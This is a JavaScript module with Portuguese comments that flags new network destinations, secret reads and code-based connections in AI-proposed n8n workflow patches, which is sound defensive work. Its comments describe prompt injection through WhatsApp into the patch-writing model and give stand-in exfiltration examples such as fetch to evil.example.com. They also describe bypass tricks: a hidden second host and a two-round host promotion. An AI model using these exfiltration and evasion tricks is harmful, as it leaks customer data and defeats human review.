"use strict";
/* rede.js — o portão de DESTINO DE REDE.
 *
 * PORTÃO NOVO, e ele existe porque a auditoria de 24/08/2026 mediu o buraco de
 * ponta a ponta, com o código real e não com raciocínio:
 *
 *   fluxo com um `httpRequest` autenticado apontando para o CRM do Kauan;
 *   patch que muda UMA coisa — `parameters.url` para `https://evil.example.com`;
 *   `applyPatch` aceita, `validate()` passa 10 de 10 com zero falhas,
 *   as checagens 1, 2 e 3 da bateria ficam VERDES, e `podeAplicar` sai `true`.
 *
 * Três de quatro variantes de exfiltração passaram inteiras: redirecionar a `url`
 * de um nó existente, acrescentar um `httpRequest` novo, e acrescentar um `Code`
 * com `fetch` dentro. A quarta caiu por acidente, no portão de esquema, por um
 * motivo que não tem nada a ver com rede.
 *
 * A RAZÃO DE NENHUM PORTÃO PEGAR: todos eles perguntam se o documento continua
 * VÁLIDO, e o documento continua. `credentials-untouched` fica verde JUSTAMENTE
 * porque a credencial não foi tocada — o nó segue autenticando, com a mesma chave,
 * e passa a mandar tudo para outro lugar. Exfiltração não precisa de nó novo nem
 * de credencial nova. Precisa de um destino novo, e destino era o único fato que
 * ninguém olhava.
 *
 * ─────────────────────────────────────────────── por que o texto do lead importa
 *
 * O caminho de injeção está medido no `03-subprocesso-e-prompt.md`: mensagem de
 * WhatsApp de um estranho chega íntegra ao prompt da sessão que escreve o patch.
 * Então o autor do patch pode ser alguém de fora, e o único humano no caminho é o
 * Kauan lendo um diff. Num fluxo de 179 nós, uma `url` trocada dentro de um patch
 * que ARRUMA de verdade o erro que ele foi investigar não é uma coisa que se vê.
 *
 * ────────────────────────────────────────────────── a régua é o próprio fluxo
 *
 * Não existe arquivo de configuração de hosts permitidos aqui, de propósito. Uma
 * lista mantida à mão envelhece, e quem a mantém acaba pondo `*` nela. A régua é
 * DERIVADA: os hosts que o documento ORIGINAL já alcança são os conhecidos. Um
 * host que não aparece em lugar nenhum do fluxo de antes é novo, e novo é o que
 * merece ser dito. Mesma disciplina do `catalog.js`, que aprende o que a instância
 * aceita lendo os fluxos dela em vez de declarar uma lista.
 *
 * ───────────────────────────────────────────────────────────── FATOS, não juízo
 *
 * Este módulo diz "o nó X passou a alcançar `evil.example.com`, que não aparece no
 * fluxo de antes". Ele NÃO diz reprovado, não escolhe cor e não decide se o botão
 * aparece. Quem decide é `bateria.js`, como sempre — e a razão é a de sempre: a
 * régua do que é grave é a parte que o Kauan ajusta mais.
 *
 * Puro: sem rede, sem disco, sem `require` do `n8n.js`. Dirigível direto por
 * teste, que é o que `rede-test.js` faz.
 *
 * ─────────────────────────────────────────────── o que ele NÃO pega, declarado
 *
 * 1. Destino que já está no fluxo. Se o próprio fluxo já fala com um host, mandar
 *    mais dados para lá não é destino novo — e não dá para distinguir isso de uso
 *    legítimo sem saber o que cada host faz.
 * 2. Exfiltração por serviço legítimo já usado. Escrever a conversa numa planilha
 *    que o fluxo já escreve é invisível para esta régua, por construção.
 * 3. IP literal atrás de DNS. `evil.example.com` e o IP dele são strings
 *    diferentes; a régua compara texto.
 * 4. Host montado por concatenação em tempo de execução dentro de um `Code`. O que
 *    sobra nesse caso é o achado `codigoRede`, que é mais grosso de propósito.
 */

/* ──────────────────────── quais achados significam SAÍDA DE DADO ──────────── */

/* Dos sete tipos que este arquivo produz, três significam que o patch fez o nó
 * ALCANÇAR um lugar; o resto significa que ele passou a ler ou citar algo. Essa
 * separação é taxonomia da classificação daqui — quem define os tipos define
 * quais deles são da mesma natureza — e por isso ela mora neste arquivo e não nos
 * dois consumidores.
 *
 * O QUE ISTO NÃO É: política. Que cor a linha ganha, se o botão some, se a rodada
 * volta para o modelo — nada disso se decide aqui. `bateria.js` pinta, o
 * `validate()` do `claude-fix.js` reprova, e os dois leem esta lista. Uma segunda
 * cópia dela num deles divergiria na primeira correção feita num lado só, e o lado
 * que divergisse desligaria o bloqueio no caminho que escreve em produção.
 *
 * `teto` NÃO está aqui de propósito, e não é esquecimento: ele não afirma saída de
 * dado, afirma que a varredura não terminou. Quem consome tem de tratá-lo como
 * grave pelo próprio motivo — "não sei" e "não tem" são fatos diferentes — e é por
 * isso que ele não podia ser dissolvido nesta lista.
 *
 * O mutante que este conjunto existe para tornar visível PRESERVA A CONTAGEM:
 * tirar `destinoNovo` daqui e pôr `mencaoNova` no lugar mantém três elementos e
 * desliga o bloqueio. Por isso `rede-test.js` confere QUAIS, nunca quantos. */
const REPROVAM_REDE = new Set(["destinoNovo", "destinoDinamico", "codigoRede"]);

/* ────────────────────────────────────────────────────────────── os tetos ───── */

/* Mesmos números e mesmo motivo do `preencher.js`: um portão que desiste em
   silêncio é pior que portão nenhum, porque a tela fica verde dos dois jeitos.
   Quando um teto estoura ele vira achado, com nome. */
const PROF_MAX = 14;
const STRINGS_MAX = 4000;

/* ───────────────────────────────────────────────── de onde sai um destino ──── */

/* Chaves de parâmetro que carregam endereço. `url` é a do `httpRequest`; as outras
   aparecem em webhook de saída, em nó de e-mail e em integração genérica.
   Ancoradas, porque `imageUrl` num prompt de modelo não é destino de rede — e um
   portão que reprovasse isso morreria no primeiro patch de agente. */
const CHAVE_URL = /^(url|uri|endpoint|baseUrl|webhookUrl|hookUrl|host|hostname|server|serverUrl|redirectUri|callbackUrl)$/i;

/* Chaves que carregam CÓDIGO. Mesma lista do `bateria.js`, e é cópia consciente:
   as duas casas conferem coisas diferentes sobre o mesmo conjunto, e unificá-las
   num terceiro módulo criaria uma dependência entre um portão e outro por uma
   constante de sete palavras. Se a lista divergir, é o `rede-test.js` que reclama. */
const CHAVE_CODIGO = /^(jsCode|functionCode|pythonCode|code)$/;

/* Primitivas de rede dentro de código. A lista é curta e fechada porque cada
   entrada é uma forma de ABRIR CONEXÃO, não de mencionar a palavra "http": uma
   string com um link de documentação num comentário de `jsCode` não casa com
   nenhuma delas.

   A PRIMEIRA VERSÃO NÃO CONHECIA NENHUMA PRIMITIVA DO N8N, e essa era a metade
   que mais importava. Um nó `Code` do n8n não precisa de `fetch`: o jeito que a
   documentação ensina é `this.helpers.httpRequest`, e existem ainda
   `helpers.request` (a forma antiga) e `$http`. As quatro passavam batido — ou
   seja, o achado `codigoRede` era cego justamente para o caminho mais provável de
   quem escreve um nó `Code` neste ecossistema. Medido com as cinco formas antes e
   depois; só `fetch` era pega. */
const CODIGO_REDE = /\b(?:fetch|axios|XMLHttpRequest|WebSocket|EventSource|urllib|socket)\s*[.(]|\bhttps?\s*\.\s*request|\brequire\s*\(\s*["'](?:https?|net|dgram|dns|child_process)["']|\brequests\s*\.\s*(?:get|post|put)|\bchild_process\b|\bhelpers\s*\.\s*(?:httpRequest|httpRequestWithAuthentication|request)\b|\$http\s*[.(]/;

/* Acesso a segredo do ambiente dentro de expressão ou código. `$env` e `$secrets`
   são n8n; `process.env` é o que aparece num `Code`. Isto é achado por si só —
   um patch que passa a LER segredo é uma mudança de natureza, mesmo que o destino
   não mude. */
const LE_SEGREDO = /\$env\b|\$secrets\b|process\s*\.\s*env\b|\$credentials\b/;

/* Interpolação do objeto INTEIRO. Despeja o item completo — que nesta instância é
   conversa de cliente. Um campo específico NÃO casa, e essa é a linha que separa o
   achado do ruído: mandar um campo é o que todo fluxo faz. */
const DESPEJO = /\{\{[^}]*\$json\s*\}\}|\{\{[^}]*stringify\s*\(\s*\$json\s*\)|\{\{[^}]*\$input\s*\.\s*all\s*\(/;

/* ────────────────────────────────────────────────────────────── utilidades ─── */

const RE_HOST = /\b(?:https?|wss?|ftp):\/\/([^/\s"'`?#]+)/gi;

/* Normaliza um host cru capturado pela regex. */
function limparHost(h) {
  const arroba = h.lastIndexOf("@");          // usuário:senha@host
  if (arroba >= 0) h = h.slice(arroba + 1);
  h = h.replace(/:\d+$/, "").toLowerCase();   // porta fora: mudar de porta não é mudar de destino
  return h || null;
}

/* TODOS os hosts de uma string, e o plural é o ponto.
 *
 * A primeira versão devolvia só o primeiro, e o próprio conjunto de falsos
 * positivos deste arquivo encontrou o buraco: um `systemMessage` com dois links
 * reportava um host e escondia o outro. Isso não é imprecisão, é BYPASS — basta
 * pôr um endereço legítimo na frente do endereço de exfiltração no mesmo campo
 * (`https://docs.n8n.io ... fetch('https://evil.example.com')` dentro de um
 * `jsCode`) para o portão nunca ver o segundo. Um portão que lê só o primeiro
 * host ensina exatamente como contorná-lo. */
function hostsDe(s) {
  const out = [];
  const t = String(s);
  RE_HOST.lastIndex = 0;                      // regex com /g guarda estado entre chamadas
  let m;
  while ((m = RE_HOST.exec(t)) !== null) {
    const h = limparHost(m[1]);
    if (h) out.push(h);
  }
  return out;
}

/* O PRIMEIRO host de uma string, ou `null`. Continua existindo porque
   `ehDinamico` precisa saber onde o host começa para comparar com a posição do
   `{{` — uma pergunta sobre posição, não sobre conjunto. */
function hostDe(s) {
  const hs = hostsDe(s);
  return hs.length ? hs[0] : null;
}

/* Uma expressão n8n cujo host não dá para ler estaticamente. Resolve em tempo de
   execução, e o cockpit não executa — então o destino é DESCONHECIDO, que é um
   fato mais forte que "não achei host". */
function ehDinamico(s) {
  const t = String(s);
  if (!t.includes("{{")) return false;
  const h = hostDe(t);
  if (!h) return true;
  return t.indexOf("{{") < t.indexOf(h);
}

/* Anda no objeto de parâmetros de um nó e chama `visita(chave, valor, caminho)`
   em cada folha de texto. Marca `estado.cortou` se estourar um teto — o chamador
   transforma isso em achado, nunca em silêncio. */
function andar(valor, caminho, visita, estado) {
  if (estado.cortou) return true;
  if (caminho.length > PROF_MAX) { estado.cortou = "profundidade"; return true; }
  if (typeof valor === "string") {
    if (++estado.strings > STRINGS_MAX) { estado.cortou = "quantidade de textos"; return true; }
    visita(caminho.length ? caminho[caminho.length - 1] : "", valor, caminho.join("."));
    return false;
  }
  if (!valor || typeof valor !== "object") return false;
  if (Array.isArray(valor)) {
    for (let i = 0; i < valor.length; i++) {
      if (andar(valor[i], caminho.concat(String(i)), visita, estado)) return true;
    }
  } else {
    for (const k of Object.keys(valor)) {
      if (andar(valor[k], caminho.concat(k), visita, estado)) return true;
    }
  }
  return !!estado.cortou;
}

/* O trecho que vai para a tela e para o prompt. Curto de propósito: o valor de um
   parâmetro nesta instância carrega dado de cliente, e este achado viaja. */
function recorte(s) {
  const t = String(s).replace(/\s+/g, " ").trim();
  return t.length > 120 ? t.slice(0, 119) + "…" : t;
}

/* Tudo que um nó alcança, mais o que ele lê. Só os `parameters`: `credentials`
   nunca chega aqui (o `sanitizedWorkflow` já tirou) e `position` não é destino. */
/* DESTINO ou MENÇÃO, e a separação foi MEDIDA, não escolhida.
 *
 * Varridos 22 fluxos reais desta instância, 749 nós: das 80 ocorrências de host
 * dentro de `parameters`, **35 (44%) estão em chaves que não são destino de rede**
 * — `systemMessage` 10 (prosa do prompt de um agente), `fieldValue` 9 (um valor
 * gravado numa planilha), `cachedResultUrl` 4 (cache de UI que o editor do n8n
 * escreve sozinho), `content` 4, `blocksUi` 3.
 *
 * Tratar as duas classes igual custaria uma das duas coisas, e as duas matam o
 * portão: varrer tudo como destino faz editar o prompt de um agente virar alerta
 * vermelho — e a calibração do `preencher.js` já pagou para aprender que um achado
 * correto e inconsequente é RUÍDO, que ensina a clicar em ignorar. Varrer só as
 * chaves de destino abre bypass: o `value` de um `resourceLocator` é destino de
 * verdade e não se chama `url`.
 *
 * Então nada é descartado e nada é confundido: chave de destino vira
 * `destinoNovo`, o resto vira `mencaoNova`, que é um achado mais fraco e de nome
 * próprio. Quem pinta decide o peso de cada um — aqui só se afirma qual é qual.
 *
 * `resourceLocator`: o `value` só conta como destino quando o pai é chave de URL,
 * porque `{__rl:true, value:"..."}` debaixo de `url` É a url. Debaixo de
 * `documentId` é um id de planilha. */
function ehChaveDestino(chave, caminho) {
  if (CHAVE_URL.test(String(chave))) return true;
  if (String(chave) === "value" || String(chave) === "cachedResultUrl") {
    const partes = String(caminho).split(".");
    const pai = partes.length >= 2 ? partes[partes.length - 2] : "";
    return CHAVE_URL.test(pai);
  }
  return false;
}

function perfilDoNo(no) {
  const p = { hosts: new Set(), mencoes: new Set(), dinamicos: [], codigo: [], segredo: [], despejo: [], cortou: null };
  const estado = { strings: 0, cortou: null };
  andar((no && no.parameters) || {}, [], (chave, texto, caminho) => {
    const ehUrl = CHAVE_URL.test(String(chave));
    const ehCodigo = CHAVE_CODIGO.test(String(chave));
    const temPrimitiva = ehCodigo && CODIGO_REDE.test(texto);

    /* CAMPO DE CÓDIGO SÓ CONTA COMO DESTINO QUANDO HÁ PRIMITIVA DE REDE JUNTO, e
     * isso foi medido contra a instância viva (74 fluxos, 2268 nós, só GET): dos
     * 324 campos de código, 16 carregam host, e **15 desses 16 (94%) não têm
     * primitiva nenhuma perto**. São links em texto — `drive.google.com`,
     * `calendar.app.google`, `admin.ecommercepuro.com.br`. Tratar todos como
     * destino faria um patch que acrescenta um link de documentação dentro de um
     * `Code` acender a linha que BLOQUEIA o botão.
     *
     * A regra é apertada e não frouxa, e o motivo é mecânico: um nó `Code` do n8n
     * é autocontido — não há helper definido noutro arquivo. Para a requisição
     * sair, a primitiva tem de estar NESTE mesmo texto. Então exigir que ela
     * esteja aqui não abre caminho: abre só o caso em que o host é texto morto.
     *
     * O que isto DEPENDE, e é a dívida declarada: da completude do `CODIGO_REDE`.
     * Uma primitiva que ele não conheça rebaixa o host a menção — foi exatamente o
     * que aconteceu com `this.helpers.httpRequest` até a linha acima ser corrigida.
     * Acrescentar primitiva ali é mais importante do que parece: ela não melhora só
     * o achado `codigoRede`, ela decide se o host ao lado é destino. */
    const destino = ehChaveDestino(chave, caminho) || temPrimitiva;
    for (const h of hostsDe(texto)) (destino ? p.hosts : p.mencoes).add(h);
    if (ehUrl && ehDinamico(texto)) p.dinamicos.push({ caminho, trecho: recorte(texto) });
    if (CHAVE_CODIGO.test(String(chave))) {
      const mc = texto.match(CODIGO_REDE);
      if (mc) p.codigo.push({ caminho, trecho: recorte(mc[0]) });
    }
    const ms = texto.match(LE_SEGREDO);
    if (ms) p.segredo.push({ caminho, trecho: recorte(ms[0]) });
    const md = texto.match(DESPEJO);
    if (md) p.despejo.push({ caminho, trecho: recorte(md[0]) });
  }, estado);
  p.cortou = estado.cortou;
  return p;
}

function mapaDeNos(wf) {
  const m = new Map();
  for (const n of ((wf && wf.nodes) || [])) if (n && n.name) m.set(String(n.name), n);
  return m;
}

const PERFIL_VAZIO = { hosts: new Set(), mencoes: new Set(), dinamicos: [], codigo: [], segredo: [], despejo: [], cortou: null };

/* ───────────────────────────────────────────────────────────── a varredura ─── */

/* `documento` é o fluxo de ANTES, `proposta` é o de DEPOIS. A régua sai do de
   antes: todo host que o fluxo original alcança, em qualquer nó — inclusive nos
   que o patch nem tocou. É isso que faz um patch que aponta para um serviço que o
   fluxo já usa passar em silêncio, que é o comportamento certo. */
function varrer(documento, proposta) {
  const antes = mapaDeNos(documento);
  const depois = mapaDeNos(proposta);

  /* Duas réguas, e a de destino é DELIBERADAMENTE mais estreita: ela só admite
     host que o fluxo de antes já ALCANÇAVA, nunca host que ele apenas mencionava.
     Sem isso existe um ataque em dois passos — a rodada 1 põe `evil.com` num
     `systemMessage` (achado fraco, fácil de aprovar), a rodada 2 promove o mesmo
     host a `url` e passa em silêncio, porque "o fluxo já falava nele". */
  const conhecidos = new Set();
  const mencionados = new Set();
  let cortouBase = null;
  for (const no of antes.values()) {
    const p = perfilDoNo(no);
    for (const h of p.hosts) { conhecidos.add(h); mencionados.add(h); }
    for (const h of p.mencoes) mencionados.add(h);
    if (p.cortou) cortouBase = p.cortou;
  }

  const achados = [];
  const push = (tipo, no, detalhe) => achados.push(Object.assign({ tipo, no }, detalhe));

  /* Só os nós que existem DEPOIS. Um nó removido não alcança nada, e o `applyPatch`
     do caminho de produção nem tem verbo de remoção. */
  for (const [nome, noDepois] of depois) {
    const noAntes = antes.get(nome);
    const pd = perfilDoNo(noDepois);
    const pa = noAntes ? perfilDoNo(noAntes) : PERFIL_VAZIO;

    if (pd.cortou) push("teto", nome, { limite: pd.cortou });

    for (const h of pd.hosts) {
      if (pa.hosts.has(h)) continue;              // esse nó já falava com esse host
      if (conhecidos.has(h)) continue;            // o fluxo já falava com esse host
      push("destinoNovo", nome, { host: h, novoNo: !noAntes });
    }

    for (const h of pd.mencoes) {
      if (pa.mencoes.has(h) || pa.hosts.has(h)) continue;
      if (mencionados.has(h)) continue;
      push("mencaoNova", nome, { host: h, novoNo: !noAntes });
    }

    /* Os quatro abaixo comparam CONTAGEM contra o estado de antes, para um nó que
       já tinha um `Code` com `fetch` não virar achado a cada patch que encosta
       nele por outro motivo. */
    if (pd.dinamicos.length > pa.dinamicos.length) {
      push("destinoDinamico", nome, pd.dinamicos[pd.dinamicos.length - 1]);
    }
    if (pd.codigo.length > pa.codigo.length) {
      push("codigoRede", nome, pd.codigo[pd.codigo.length - 1]);
    }
    if (pd.segredo.length > pa.segredo.length) {
      push("leSegredo", nome, pd.segredo[pd.segredo.length - 1]);
    }
    if (pd.despejo.length > pa.despejo.length) {
      push("despejo", nome, pd.despejo[pd.despejo.length - 1]);
    }
  }

  return { achados, conhecidos: [...conhecidos].sort(), cortouBase };
}

/* A frase de um achado. Fato, sem adjetivo: diz o que mudou e onde, e deixa a
   gravidade para quem pinta. Serve a tela E o prompt de correção — a mesma frase
   nos dois lugares, pelo mesmo motivo do `preencher.js`. */
function frase(a) {
  switch (a.tipo) {
    case "destinoNovo":
      return "`" + a.no + "` passa a alcançar `" + a.host + "`"
        + (a.novoNo ? " (nó novo)" : "") + " — esse endereço não aparece em nenhum nó do fluxo de antes";
    case "mencaoNova":
      return "`" + a.no + "` passa a citar `" + a.host + "` num campo que NÃO é destino de rede"
        + (a.novoNo ? " (nó novo)" : "") + " — o nó não chama esse endereço, mas ele não aparecia no fluxo de antes";
    case "destinoDinamico":
      return "`" + a.no + "` passa a ter destino montado em tempo de execução em `" + a.caminho
        + "` (`" + a.trecho + "`) — não dá para saber para onde ele aponta sem executar";
    case "codigoRede":
      return "`" + a.no + "` passa a ter código que abre conexão em `" + a.caminho
        + "` (`" + a.trecho + "`)";
    case "leSegredo":
      return "`" + a.no + "` passa a ler segredo do ambiente em `" + a.caminho
        + "` (`" + a.trecho + "`)";
    case "despejo":
      return "`" + a.no + "` passa a interpolar o item INTEIRO em `" + a.caminho
        + "` (`" + a.trecho + "`) — nesta instância isso é a conversa do cliente";
    case "teto":
      return "não terminei de varrer `" + a.no + "`: estourei o teto de " + a.limite
        + ", então o que está além dele não foi conferido";
    default:
      return "achado sem frase: " + a.tipo;
  }
}

module.exports = {
  varrer, frase, perfilDoNo, hostDe, hostsDe, ehDinamico,
  REPROVAM_REDE,
  CHAVE_URL, CHAVE_CODIGO, CODIGO_REDE, LE_SEGREDO, DESPEJO, PROF_MAX, STRINGS_MAX
};
